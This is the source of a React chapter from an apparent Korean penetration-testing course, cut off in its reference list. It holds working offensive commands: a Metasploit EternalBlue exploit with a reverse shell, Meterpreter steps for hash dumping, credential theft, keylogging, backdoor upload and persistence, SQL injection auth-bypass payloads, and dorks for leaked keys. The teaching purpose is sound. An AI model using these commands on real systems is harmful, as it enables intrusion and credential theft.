import React from 'react';
import { Bug, Search, AlertTriangle, Terminal, Shield, DollarSign, Code } from 'lucide-react';
import References from '../References';

export default function Chapter6() {
  return (
    <div className="space-y-8">
      <div>
        <h1 className="text-4xl font-bold text-gray-900 dark:text-white mb-4">
          침투 테스트
        </h1>
        <p className="text-xl text-gray-600 dark:text-gray-300">
          윤리적 해킹과 취약점 분석 기법을 학습합니다
        </p>
      </div>

      {/* 2024-2025 트렌드 */}
      <section className="bg-gradient-to-r from-purple-600 to-pink-600 text-white rounded-xl p-6 shadow-lg">
        <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
          <AlertTriangle className="w-7 h-7" />
          2024-2025 침투 테스트 트렌드
        </h2>
        <div className="grid md:grid-cols-3 gap-4 text-sm">
          <div className="bg-white/10 backdrop-blur-sm rounded-lg p-4">
            <div className="font-bold mb-2">🤖 AI 기반 공격</div>
            <div className="text-white/90">ChatGPT/GPT-4를 활용한 자동화 공격 도구 등장 (WormGPT, FraudGPT)</div>
          </div>
          <div className="bg-white/10 backdrop-blur-sm rounded-lg p-4">
            <div className="font-bold mb-2">☁️ 클라우드 펜테스팅</div>
            <div className="text-white/90">AWS/Azure/GCP 전용 도구 수요 급증 (ScoutSuite, Prowler, CloudFox)</div>
          </div>
          <div className="bg-white/10 backdrop-blur-sm rounded-lg p-4">
            <div className="font-bold mb-2">💰 Bug Bounty 시장</div>
            <div className="text-white/90">2024년 전 세계 버그바운티 보상금 $2.4억 돌파 (HackerOne 통계)</div>
          </div>
        </div>
      </section>

      {/* PTES Framework */}
      <section className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg">
        <h2 className="text-2xl font-bold mb-6 text-gray-900 dark:text-white flex items-center gap-2">
          <Search className="w-7 h-7 text-purple-600" />
          PTES (Penetration Testing Execution Standard) - 표준 침투 테스트 프레임워크
        </h2>

        <div className="space-y-4">
          {[
            {
              step: 1,
              phase: 'Pre-engagement Interactions (사전 협의)',
              desc: '범위 정의, 법적 계약, 테스트 목표 설정',
              details: '• 테스트 범위 (IP 대역, 도메인, 애플리케이션)\n• Rules of Engagement (RoE) 문서 작성\n• 긴급 연락망 구축\n• 법적 면책 조항 서명'
            },
            {
              step: 2,
              phase: 'Intelligence Gathering (정보 수집)',
              desc: 'OSINT, 도메인 정보, 기술 스택 파악',
              details: '• WHOIS, DNS 조회\n• Google Dorking, Shodan 검색\n• GitHub/GitLab 코드 유출 확인\n• LinkedIn으로 직원 정보 수집'
            },
            {
              step: 3,
              phase: 'Threat Modeling (위협 모델링)',
              desc: '공격 경로 분석 및 우선순위 결정',
              details: '• Attack Tree 작성\n• STRIDE/DREAD 모델 적용\n• Critical Assets 식별\n• Attack Surface 매핑'
            },
            {
              step: 4,
              phase: 'Vulnerability Analysis (취약점 분석)',
              desc: 'Nmap, Nessus, Burp Suite로 취약점 탐지',
              details: '• 포트 스캔 (Nmap)\n• 웹 취약점 스캔 (Burp Suite, OWASP ZAP)\n• 네트워크 취약점 스캔 (Nessus, OpenVAS)\n• Manual Testing (비즈니스 로직 취약점)'
            },
            {
              step: 5,
              phase: 'Exploitation (익스플로잇)',
              desc: 'Metasploit, Custom Exploit으로 침투 시도',
              details: '• Metasploit Framework 활용\n• Custom Exploit 개발 (Python, Ruby)\n• Social Engineering (Phishing, Vishing)\n• Physical Access (Badge Cloning, Tailgating)'
            },
            {
              step: 6,
              phase: 'Post Exploitation (권한 상승)',
              desc: '내부망 이동, 데이터 탈취, 지속성 확보',
              details: '• Lateral Movement (mimikatz, PsExec)\n• Privilege Escalation (Linux: sudo, SUID / Windows: UAC Bypass)\n• Data Exfiltration (DNS tunneling, HTTPS)\n• Persistence (Backdoor, Rootkit)'
            },
            {
              step: 7,
              phase: 'Reporting (보고서 작성)',
              desc: '발견된 취약점 및 해결 방안 문서화',
              details: '• Executive Summary (경영진용)\n• Technical Details (개발팀용)\n• CVSS 점수 및 위험도 평가\n• Remediation Roadmap (우선순위별 해결 방안)'
            },
          ].map((item) => (
            <div key={item.step} className="bg-purple-50 dark:bg-purple-900/20 p-5 rounded-lg border-l-4 border-purple-500">
              <div className="flex gap-3 mb-3">
                <span className="flex-shrink-0 w-10 h-10 bg-purple-600 text-white rounded-full flex items-center justify-center font-bold">
                  {item.step}
                </span>
                <div>
                  <h3 className="font-bold text-lg text-purple-900 dark:text-purple-300">{item.phase}</h3>
                  <p className="text-sm text-gray-600 dark:text-gray-400 mt-1">{item.desc}</p>
                </div>
              </div>
              <div className="ml-13 mt-3 pt-3 border-t border-purple-200 dark:border-purple-700">
                <pre className="text-xs text-gray-700 dark:text-gray-300 whitespace-pre-wrap font-mono">
{item.details}
                </pre>
              </div>
            </div>
          ))}
        </div>
      </section>

      {/* Nmap 실전 명령어 */}
      <section className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg">
        <h2 className="text-2xl font-bold mb-6 text-gray-900 dark:text-white flex items-center gap-2">
          <Terminal className="w-7 h-7 text-green-600" />
          Nmap 실전 명령어 (Network Scanner)
        </h2>

        <div className="space-y-4">
          <div className="bg-gray-50 dark:bg-gray-900 p-4 rounded-lg">
            <h3 className="font-bold text-green-700 dark:text-green-400 mb-2">1. 기본 포트 스캔 (TCP SYN Scan)</h3>
            <pre className="bg-black text-green-400 p-4 rounded-lg overflow-x-auto text-sm">
{`# 가장 빠른 스캔 (스텔스 모드)
sudo nmap -sS -p- 192.168.1.0/24

# 상위 1000개 포트만 스캔 (기본값)
nmap 192.168.1.100

# 특정 포트만 스캔
nmap -p 22,80,443,3306 192.168.1.100`}
            </pre>
          </div>

          <div className="bg-gray-50 dark:bg-gray-900 p-4 rounded-lg">
            <h3 className="font-bold text-green-700 dark:text-green-400 mb-2">2. 서비스 버전 탐지 + OS 핑거프린팅</h3>
            <pre className="bg-black text-green-400 p-4 rounded-lg overflow-x-auto text-sm">
{`# 서비스 버전 탐지 (-sV)
nmap -sV 192.168.1.100
# 출력 예: 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1

# OS 탐지 + 버전 탐지 (공격적 스캔)
sudo nmap -A 192.168.1.100

# OS 탐지만 수행
sudo nmap -O 192.168.1.100
# 출력 예: OS: Linux 5.15 - 6.1`}
            </pre>
          </div>

          <div className="bg-gray-50 dark:bg-gray-900 p-4 rounded-lg">
            <h3 className="font-bold text-green-700 dark:text-green-400 mb-2">3. NSE (Nmap Scripting Engine) - 취약점 스캔</h3>
            <pre className="bg-black text-green-400 p-4 rounded-lg overflow-x-auto text-sm">
{`# 기본 취약점 스크립트 실행
nmap --script vuln 192.168.1.100

# SSL/TLS 취약점 점검 (Heartbleed, POODLE 등)
nmap --script ssl-heartbleed,ssl-poodle 192.168.1.100

# SMB 취약점 점검 (EternalBlue MS17-010)
nmap --script smb-vuln-ms17-010 192.168.1.100

# 모든 HTTP 관련 스크립트 실행
nmap --script "http-*" -p 80,443 192.168.1.100`}
            </pre>
          </div>

          <div className="bg-gray-50 dark:bg-gray-900 p-4 rounded-lg">
            <h3 className="font-bold text-green-700 dark:text-green-400 mb-2">4. 스텔스 스캔 (방화벽 우회)</h3>
            <pre className="bg-black text-green-400 p-4 rounded-lg overflow-x-auto text-sm">
{`# FIN/NULL/Xmas 스캔 (일부 방화벽 우회 가능)
sudo nmap -sF 192.168.1.100  # FIN scan
sudo nmap -sN 192.168.1.100  # NULL scan
sudo nmap -sX 192.168.1.100  # Xmas scan

# Decoy 스캔 (출처 IP 위장)
sudo nmap -D RND:10 192.168.1.100
# 10개의 랜덤 IP를 Decoy로 사용하여 실제 출처 숨김

# Fragment 스캔 (패킷 분할로 IDS 우회)
sudo nmap -f 192.168.1.100`}
            </pre>
          </div>

          <div className="bg-gray-50 dark:bg-gray-900 p-4 rounded-lg">
            <h3 className="font-bold text-green-700 dark:text-green-400 mb-2">5. 출력 형식 (보고서용)</h3>
            <pre className="bg-black text-green-400 p-4 rounded-lg overflow-x-auto text-sm">
{`# XML 형식으로 저장 (다른 도구와 연동 가능)
nmap -oX scan_results.xml 192.168.1.0/24

# 모든 형식으로 저장 (일반/XML/Grepable)
nmap -oA scan_output 192.168.1.100

# 실시간 진행상황 표시
nmap -v 192.168.1.0/24`}
            </pre>
          </div>
        </div>

        <div className="mt-4 bg-yellow-50 dark:bg-yellow-900/20 border-l-4 border-yellow-500 p-4">
          <p className="text-sm text-yellow-800 dark:text-yellow-200">
            <strong>⚠️ 법적 주의사항:</strong> Nmap 스캔은 사전 승인 없이 타인의 시스템에 수행 시
            <strong className="text-red-600 dark:text-red-400"> 컴퓨터 사용 사기죄</strong> (형법 제347조의2)에 해당할 수 있습니다.
            반드시 <strong>서면 허가</strong>를 받은 범위 내에서만 수행하세요.
          </p>
        </div>
      </section>

      {/* Metasploit 실전 */}
      <section className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg">
        <h2 className="text-2xl font-bold mb-6 text-gray-900 dark:text-white flex items-center gap-2">
          <Bug className="w-7 h-7 text-red-600" />
          Metasploit Framework - Exploitation 실전
        </h2>

        <div className="space-y-4">
          <div className="bg-gray-50 dark:bg-gray-900 p-4 rounded-lg">
            <h3 className="font-bold text-red-700 dark:text-red-400 mb-2">1. Metasploit 기본 워크플로우</h3>
            <pre className="bg-black text-green-400 p-4 rounded-lg overflow-x-auto text-sm">
{`# Metasploit 콘솔 실행
msfconsole

# 익스플로잇 검색 (예: EternalBlue)
msf6 > search ms17-010

# 익스플로잇 선택
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 타겟 정보 확인
msf6 exploit(ms17_010_eternalblue) > show targets

# 페이로드 설정 (Reverse TCP Shell)
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 옵션 확인 및 설정
msf6 exploit(ms17_010_eternalblue) > show options
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.10
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# 익스플로잇 실행
msf6 exploit(ms17_010_eternalblue) > exploit

# Meterpreter 세션 획득 시
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump  # 패스워드 해시 덤프`}
            </pre>
          </div>

          <div className="bg-gray-50 dark:bg-gray-900 p-4 rounded-lg">
            <h3 className="font-bold text-red-700 dark:text-red-400 mb-2">2. 자주 사용하는 Exploit Modules</h3>
            <div className="overflow-x-auto">
              <table className="min-w-full text-sm">
                <thead className="bg-red-100 dark:bg-red-900/30">
                  <tr>
                    <th className="px-4 py-2 text-left">Module Path</th>
                    <th className="px-4 py-2 text-left">CVE</th>
                    <th className="px-4 py-2 text-left">설명</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-200 dark:divide-gray-700">
                  <tr>
                    <td className="px-4 py-2 font-mono text-xs">exploit/windows/smb/ms17_010_eternalblue</td>
                    <td className="px-4 py-2">CVE-2017-0144</td>
                    <td className="px-4 py-2">Windows SMB RCE (WannaCry 사용)</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-2 font-mono text-xs">exploit/linux/http/apache_mod_cgi_bash_env_exec</td>
                    <td className="px-4 py-2">CVE-2014-6271</td>
                    <td className="px-4 py-2">Shellshock (Bash 환경변수 RCE)</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-2 font-mono text-xs">exploit/multi/http/struts2_content_type_ognl</td>
                    <td className="px-4 py-2">CVE-2017-5638</td>
                    <td className="px-4 py-2">Apache Struts2 RCE (Equifax 해킹)</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-2 font-mono text-xs">exploit/windows/rdp/cve_2019_0708_bluekeep_rce</td>
                    <td className="px-4 py-2">CVE-2019-0708</td>
                    <td className="px-4 py-2">BlueKeep (RDP 사전인증 RCE)</td>
                  </tr>
                  <tr>
                    <td className="px-4 py-2 font-mono text-xs">exploit/linux/http/webmin_packageup_rce</td>
                    <td className="px-4 py-2">CVE-2019-15107</td>
                    <td className="px-4 py-2">Webmin RCE (Package Updates)</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

          <div className="bg-gray-50 dark:bg-gray-900 p-4 rounded-lg">
            <h3 className="font-bold text-red-700 dark:text-red-400 mb-2">3. Meterpreter Post-Exploitation 명령어</h3>
            <pre className="bg-black text-green-400 p-4 rounded-lg overflow-x-auto text-sm">
{`# 시스템 정보 수집
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps  # 프로세스 목록

# 권한 상승 (Privilege Escalation)
meterpreter > getsystem  # UAC 우회 시도
meterpreter > use priv
meterpreter > getsystem -t 1  # Named Pipe Impersonation

# 패스워드 해시 덤프
meterpreter > hashdump
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Mimikatz 실행 (평문 패스워드 추출)
meterpreter > load kiwi
meterpreter > creds_all

# 화면 캡처 및 키로깅
meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > keyscan_dump

# 파일 업로드/다운로드
meterpreter > upload /root/backdoor.exe C:\\\\Windows\\\\Temp\\\\
meterpreter > download C:\\\\Users\\\\Admin\\\\Documents\\\\passwords.txt /tmp/

# Persistence (지속성 확보)
meterpreter > run persistence -X -i 5 -p 4444 -r 192.168.1.10

# 네트워크 피벗팅 (내부망 접근)
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > background
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(tcp) > set RHOSTS 10.10.10.50
msf6 auxiliary(tcp) > run`}
            </pre>
          </div>
        </div>
      </section>

      {/* Burp Suite */}
      <section className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg">
        <h2 className="text-2xl font-bold mb-6 text-gray-900 dark:text-white flex items-center gap-2">
          <Code className="w-7 h-7 text-orange-600" />
          Burp Suite - 웹 애플리케이션 침투 테스트
        </h2>

        <div className="space-y-4">
          <div className="bg-gray-50 dark:bg-gray-900 p-4 rounded-lg">
            <h3 className="font-bold text-orange-700 dark:text-orange-400 mb-3">핵심 기능 및 활용법</h3>

            <div className="grid md:grid-cols-2 gap-4">
              <div className="bg-white dark:bg-gray-800 p-4 rounded-lg border border-orange-200 dark:border-orange-700">
                <h4 className="font-bold text-orange-600 mb-2">1. Proxy (요청/응답 가로채기)</h4>
                <ul className="text-sm space-y-1 text-gray-700 dark:text-gray-300">
                  <li>• HTTP/HTTPS 트래픽 가로채기</li>
                  <li>• 요청 파라미터 수정 (SQL Injection 테스트)</li>
                  <li>• 응답 변조 (클라이언트 사이드 검증 우회)</li>
                  <li>• <span className="font-mono text-xs">Intercept is on</span> 상태로 변경 후 수정</li>
                </ul>
              </div>

              <div className="bg-white dark:bg-gray-800 p-4 rounded-lg border border-orange-200 dark:border-orange-700">
                <h4 className="font-bold text-orange-600 mb-2">2. Intruder (자동화 공격)</h4>
                <ul className="text-sm space-y-1 text-gray-700 dark:text-gray-300">
                  <li>• Brute Force 공격 (로그인, 디렉토리)</li>
                  <li>• Fuzzing (XSS, SQL Injection 페이로드)</li>
                  <li>• 4가지 공격 모드: Sniper, Battering Ram, Pitchfork, Cluster Bomb</li>
                  <li>• Payload List: SecLists, FuzzDB 활용</li>
                </ul>
              </div>

              <div className="bg-white dark:bg-gray-800 p-4 rounded-lg border border-orange-200 dark:border-orange-700">
                <h4 className="font-bold text-orange-600 mb-2">3. Repeater (수동 테스트)</h4>
                <ul className="text-sm space-y-1 text-gray-700 dark:text-gray-300">
                  <li>• 개별 요청 반복 전송</li>
                  <li>• SQL Injection 페이로드 테스트</li>
                  <li>• IDOR (Insecure Direct Object Reference) 확인</li>
                  <li>• <span className="font-mono text-xs">Ctrl+R</span>로 Repeater 전송</li>
                </ul>
              </div>

              <div className="bg-white dark:bg-gray-800 p-4 rounded-lg border border-orange-200 dark:border-orange-700">
                <h4 className="font-bold text-orange-600 mb-2">4. Scanner (자동 취약점 스캔)</h4>
                <ul className="text-sm space-y-1 text-gray-700 dark:text-gray-300">
                  <li>• OWASP Top 10 자동 탐지</li>
                  <li>• Active Scan (침투적 스캔)</li>
                  <li>• Passive Scan (비침투적 분석)</li>
                  <li>• <strong className="text-red-600">Burp Suite Pro 전용 기능</strong></li>
                </ul>
              </div>

              <div className="bg-white dark:bg-gray-800 p-4 rounded-lg border border-orange-200 dark:border-orange-700">
                <h4 className="font-bold text-orange-600 mb-2">5. Decoder (인코딩/디코딩)</h4>
                <ul className="text-sm space-y-1 text-gray-700 dark:text-gray-300">
                  <li>• Base64, URL, HTML, Hex 인코딩</li>
                  <li>• JWT 토큰 디코딩</li>
                  <li>• Hash 계산 (MD5, SHA-256)</li>
                  <li>• 난독화된 페이로드 분석</li>
                </ul>
              </div>

              <div className="bg-white dark:bg-gray-800 p-4 rounded-lg border border-orange-200 dark:border-orange-700">
                <h4 className="font-bold text-orange-600 mb-2">6. Collaborator (외부 상호작용 탐지)</h4>
                <ul className="text-sm space-y-1 text-gray-700 dark:text-gray-300">
                  <li>• Out-of-Band 취약점 탐지</li>
                  <li>• Blind SSRF, XXE, SQL Injection</li>
                  <li>• DNS/HTTP 요청 감지</li>
                  <li>• <strong className="text-red-600">Burp Suite Pro 전용</strong></li>
                </ul>
              </div>
            </div>
          </div>

          <div className="bg-gray-50 dark:bg-gray-900 p-4 rounded-lg">
            <h3 className="font-bold text-orange-700 dark:text-orange-400 mb-2">실전 예제: SQL Injection 테스트</h3>
            <pre className="bg-black text-green-400 p-4 rounded-lg overflow-x-auto text-sm">
{`# 1. Burp Proxy로 로그인 요청 가로채기
POST /login HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=test123

# 2. Repeater로 전송 후 SQL Injection 페이로드 테스트
username=admin' OR '1'='1&password=test123
username=admin' UNION SELECT NULL,NULL,NULL--&password=test123

# 3. 응답에서 DB 에러 또는 인증 우회 확인
HTTP/1.1 200 OK
{"success": true, "role": "admin", "token": "eyJhbGciOiJIUzI1NiIs..."}

# 4. Intruder로 DB 정보 추출 (Blind SQL Injection)
username=admin' AND SUBSTRING((SELECT database()),1,1)='a'--&password=test
# Payload List: a-z, 0-9를 Sniper 모드로 순차 테스트`}
            </pre>
          </div>
        </div>

        <div className="mt-4 bg-blue-50 dark:bg-blue-900/20 border-l-4 border-blue-500 p-4">
          <p className="text-sm text-blue-800 dark:text-blue-200">
            <strong>💡 Burp Suite Editions:</strong><br/>
            • <strong>Community (무료)</strong>: Proxy, Repeater, Decoder, Comparer<br/>
            • <strong>Professional ($449/년)</strong>: Scanner, Intruder (속도 제한 없음), Collaborator, Extensions<br/>
            • <strong>Enterprise ($4,000+/년)</strong>: CI/CD 통합, API 스캔, 팀 협업
          </p>
        </div>
      </section>

      {/* Bug Bounty */}
      <section className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg">
        <h2 className="text-2xl font-bold mb-6 text-gray-900 dark:text-white flex items-center gap-2">
          <DollarSign className="w-7 h-7 text-emerald-600" />
          Bug Bounty 플랫폼 - 취약점 신고 보상 프로그램
        </h2>

        <div className="overflow-x-auto mb-6">
          <table className="min-w-full text-sm">
            <thead className="bg-emerald-100 dark:bg-emerald-900/30">
              <tr>
                <th className="px-4 py-2 text-left">플랫폼</th>
                <th className="px-4 py-2 text-left">수수료</th>
                <th className="px-4 py-2 text-left">평균 보상금</th>
                <th className="px-4 py-2 text-left">주요 고객사</th>
                <th className="px-4 py-2 text-left">특징</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-200 dark:divide-gray-700">
              <tr>
                <td className="px-4 py-2 font-bold">
                  <a href="https://hackerone.com" target="_blank" rel="noopener noreferrer" className="text-emerald-600 hover:underline">
                    HackerOne
                  </a>
                </td>
                <td className="px-4 py-2">20%</td>
                <td className="px-4 py-2">$2,000 - $10,000</td>
                <td className="px-4 py-2">Google, Apple, GitHub, Microsoft</td>
                <td className="px-4 py-2">세계 최대 플랫폼, 누적 보상금 $3억+</td>
              </tr>
              <tr>
                <td className="px-4 py-2 font-bold">
                  <a href="https://bugcrowd.com" target="_blank" rel="noopener noreferrer" className="text-emerald-600 hover:underline">
                    Bugcrowd
                  </a>
                </td>
                <td className="px-4 py-2">20%</td>
                <td className="px-4 py-2">$1,500 - $8,000</td>
                <td className="px-4 py-2">Tesla, Mastercard, OpenAI</td>
                <td className="px-4 py-2">크라우드소싱 보안 테스트 전문</td>
              </tr>
              <tr>
                <td className="px-4 py-2 font-bold">
                  <a href="https://intigriti.com" target="_blank" rel="noopener noreferrer" className="text-emerald-600 hover:underline">
                    Intigriti
                  </a>
                </td>
                <td className="px-4 py-2">0% (기업 직접 부담)</td>
                <td className="px-4 py-2">€1,000 - €5,000</td>
                <td className="px-4 py-2">European Commission, NATO</td>
                <td className="px-4 py-2">유럽 최대 플랫폼, GDPR 준수</td>
              </tr>
              <tr>
                <td className="px-4 py-2 font-bold">
                  <a href="https://yeswehack.com" target="_blank" rel="noopener noreferrer" className="text-emerald-600 hover:underline">
                    YesWeHack
                  </a>
                </td>
                <td className="px-4 py-2">15%</td>
                <td className="px-4 py-2">€800 - €4,000</td>
                <td className="px-4 py-2">Deezer, BlaBlaCar, OVHcloud</td>
                <td className="px-4 py-2">프랑스 기반, 유럽 기업 다수</td>
              </tr>
              <tr>
                <td className="px-4 py-2 font-bold">
                  <a href="https://synack.com" target="_blank" rel="noopener noreferrer" className="text-emerald-600 hover:underline">
                    Synack
                  </a>
                </td>
                <td className="px-4 py-2">비공개</td>
                <td className="px-4 py-2">$5,000 - $20,000</td>
                <td className="px-4 py-2">미 국방부(DoD), Fortune 500</td>
                <td className="px-4 py-2">초대제, 엘리트 리서처 전용</td>
              </tr>
            </tbody>
          </table>
        </div>

        <div className="grid md:grid-cols-2 gap-4">
          <div className="bg-emerald-50 dark:bg-emerald-900/20 p-4 rounded-lg">
            <h3 className="font-bold text-emerald-700 dark:text-emerald-400 mb-3">🏆 Top Bug Bounty 사례 (2023-2024)</h3>
            <ul className="text-sm space-y-2 text-gray-700 dark:text-gray-300">
              <li>• <strong>$107,500</strong> - Apple iCloud RCE (HackerOne)</li>
              <li>• <strong>$70,000</strong> - Google Chrome V8 Type Confusion (Chromium Bug Tracker)</li>
              <li>• <strong>$60,000</strong> - Microsoft Azure RCE (MSRC)</li>
              <li>• <strong>$50,000</strong> - GitHub Enterprise SAML Bypass (HackerOne)</li>
              <li>• <strong>$40,000</strong> - Tesla Model 3 Key Fob Relay Attack (Bugcrowd)</li>
            </ul>
          </div>

          <div className="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg">
            <h3 className="font-bold text-blue-700 dark:text-blue-400 mb-3">📚 Bug Bounty 시작 가이드</h3>
            <ul className="text-sm space-y-2 text-gray-700 dark:text-gray-300">
              <li>• <strong>1단계</strong>: OWASP Top 10, PortSwigger Web Security Academy 학습</li>
              <li>• <strong>2단계</strong>: HackerOne Public Programs에서 중복 취약점 분석</li>
              <li>• <strong>3단계</strong>: 본인 웹사이트/앱에서 취약점 찾기 연습</li>
              <li>• <strong>4단계</strong>: Bugcrowd University, PentesterLab 유료 과정</li>
              <li>• <strong>5단계</strong>: Private Programs 초대받기 (평판 10+ Reputation)</li>
            </ul>
          </div>
        </div>

        <div className="mt-4 bg-yellow-50 dark:bg-yellow-900/20 border-l-4 border-yellow-500 p-4">
          <p className="text-sm text-yellow-800 dark:text-yellow-200">
            <strong>⚠️ Bug Bounty 윤리 강령:</strong><br/>
            • <strong>범위 준수</strong>: 프로그램 정책(Scope)을 반드시 확인하고 벗어나지 마세요<br/>
            • <strong>DoS 공격 금지</strong>: 서비스 중단을 유발하는 테스트 금지<br/>
            • <strong>데이터 유출 금지</strong>: 다른 사용자의 개인정보 절대 다운로드/공유 금지<br/>
            • <strong>중복 신고 회피</strong>: 기존에 신고된 취약점인지 확인 후 제출<br/>
            • <strong>책임있는 공개 (Responsible Disclosure)</strong>: 수정 전까지 취약점 비공개 유지
          </p>
        </div>
      </section>

      {/* OSINT Tools */}
      <section className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg">
        <h2 className="text-2xl font-bold mb-6 text-gray-900 dark:text-white flex items-center gap-2">
          <Search className="w-7 h-7 text-indigo-600" />
          OSINT (Open Source Intelligence) - 공개 정보 수집
        </h2>

        <div className="grid md:grid-cols-3 gap-4">
          {[
            {
              category: '도메인/네트워크',
              tools: [
                { name: 'Shodan', desc: '인터넷 연결 장치 검색 엔진' },
                { name: 'Censys', desc: 'IPv4 호스트 및 인증서 검색' },
                { name: 'WHOIS', desc: '도메인 등록자 정보' },
                { name: 'DNSdumpster', desc: 'DNS 레코드 시각화' },
              ]
            },
            {
              category: '사람/소셜',
              tools: [
                { name: 'Maltego', desc: '관계도 시각화 도구' },
                { name: 'theHarvester', desc: '이메일/서브도메인 수집' },
                { name: 'LinkedIn', desc: '직원 조직도 분석' },
                { name: 'Pipl', desc: '개인 정보 검색 엔진' },
              ]
            },
            {
              category: '코드/데이터',
              tools: [
                { name: 'GitHub Dorking', desc: '코드 저장소에서 비밀키 검색' },
                { name: 'Wayback Machine', desc: '과거 웹사이트 아카이브' },
                { name: 'Have I Been Pwned', desc: '유출 계정 확인' },
                { name: 'Intelligence X', desc: '다크웹 데이터 검색' },
              ]
            },
          ].map((category, idx) => (
            <div key={idx} className="bg-indigo-50 dark:bg-indigo-900/20 p-4 rounded-lg">
              <h3 className="font-bold text-indigo-700 dark:text-indigo-400 mb-3">{category.category}</h3>
              <ul className="space-y-2">
                {category.tools.map((tool, i) => (
                  <li key={i} className="text-sm">
                    <span className="font-semibold text-gray-900 dark:text-white">{tool.name}</span>
                    <p className="text-gray-600 dark:text-gray-400 text-xs">{tool.desc}</p>
                  </li>
                ))}
              </ul>
            </div>
          ))}
        </div>

        <div className="mt-6 bg-gray-50 dark:bg-gray-900 p-4 rounded-lg">
          <h3 className="font-bold text-indigo-700 dark:text-indigo-400 mb-2">Google Dorking 실전 예제</h3>
          <pre className="bg-black text-green-400 p-4 rounded-lg overflow-x-auto text-sm">
{`# 파일 타입 검색 (민감한 문서)
site:target.com filetype:pdf "confidential"
site:target.com ext:xls | ext:xlsx "password"

# 로그인 페이지 찾기
inurl:admin intitle:login
inurl:wp-admin site:target.com

# 공개된 디렉토리 리스팅
intitle:"Index of /" site:target.com

# GitHub에서 API 키 검색
site:github.com "target.com" "api_key"
site:github.com "AWS_SECRET_ACCESS_KEY"

# 에러 메시지 (정보 노출)
site:target.com intext:"Warning: mysql_connect()"
site:target.com intext:"Fatal error" intext:"Call to undefined function"`}
          </pre>
        </div>
      </section>

      {/* References */}
      <References
        sections={[
          {
            title: '📚 침투 테스트 표준 & 프레임워크',
            icon: 'docs' as const,
            color: 'border-purple-500',
            items: [
              {
                title: 'PTES (Penetration Testing Execution Standard)',
                url: 'http://www.pentest-standard.org/',
                description: '침투 테스트 표준 방법론 - 7단계 전체 프로세스',
              },
              {
                title: 'OWASP Testing Guide v4.2',
                url: 'https://owasp.org/www-project-web-security-testing-guide/',
                description: '웹 애플리케이션 침투 테스트 가이드 (400+ 페이지)',
              },
              {
                title: 'NIST SP 800-115 - Technical Guide to Information Security Testing',
                url: 'https://csrc.nist.gov/publications/detail/sp/800-115/final',
                description: '미국 NIST의 보안 테스트 기술 가이드',
              },
              {
                title: 'MITRE ATT&CK Framework',
                url: 'https://attack.mitre.org/',
                description: '실전 공격 전술 및 기법 데이터베이스 (14 Tactics, 193 Techniques)',
              },
            ],
          },
          {
            title: '🛠️ 침투 테스트 도구 공식 문서',
            icon: 'tools' as const,
            color: 'border-red-500',
            items: [
              {
                title: 'Nmap Official Documentation',
                url: 'https://nmap.org/book/man.html',
                description: 'Nmap 전체 옵션 및 NSE 스크립트 가이드',
              },
              {
                title: 'Metasploit Unleashed (Free Course)',
                url: 'https://www.offsec.com/metasploit-unleashed/',
                description: 'Offensive Security의 무료 Metasploit 교육 과정',
              },
              {
                title: 'Burp Suite Documentation',
                url: 'https://portswigger.net/burp/documentation',
                description: 'PortSwigger 공식 Burp Suite 사용 가이드',
              },
              {
                title: 'OWASP ZAP User Guide',
                url: 'https://www.zaproxy.org/docs/',
                description: '무료 오픈소스 웹 스캐너 OWASP ZAP 공식 문서',
              },
              {
                title: 'Kali Linux Official Documentation',
                url: 'https://www.kali.org/docs/',
                description: 'Kali Linux 설치 및 도구 사용법',
              },
            ],
          },
          {
            title: '💰 Bug Bounty 플랫폼 & 학습 리소스',
            icon: 'web' as const,
            color: 'border-emerald-500',
            items: [
              {
                title: 'HackerOne Platform',
                url: 'https://hackerone.com/',
                description: '세계 최대 버그바운티 플랫폼 (누적 보상금 $3억+)',
              },
              {
                title: 'Bugcrowd University',
                url: 'https://www.bugcrowd.com/hackers/bugcrowd-university/',
                description: '무료 Bug Bounty 교육 과정 (12+ 모듈)',
              },
              {
                title: 'PortSwigger Web Security Academy',
                url: 'https://portswigger.net/web-security',
                description: '무료 웹 보안 실습 랩 (200+ 취약점 시나리오)',
              },
              {
                title: 'PentesterLab',
                url: 'https://pentesterlab.com/',
                description: '실전 침투 테스트 학습 플랫폼 ($19.99/월)',
              },
              {
                title: 'HackTricks - Pentesting Bible',
                url: 'https://book.hacktricks.xyz/',
                description: '침투 테스트 기법 총정리 (커뮤니티 기반 위키)',
              },
            ],
          },
          {
            title: '📖 OSINT & 정보 수집',
            icon: 'research' as const,
            color: 'border-indigo-500',
            items: [
              {
                title: 'Shodan Search Engine',
                url: 'https://www.shodan.io/',
                description: 'IoT 기기 검색 엔진 - 인터넷 연결 장치 탐색',
              },
              {
                title: 'theHarvester on GitHub',
                url: 'https://github.com/laramies/theHarvester',
                description: '이메일, 서브도메인, IP 자동 수집 도구',
              },
              {
                title: 'OSINT Framework',
                url: 'https://osintframework.com/',
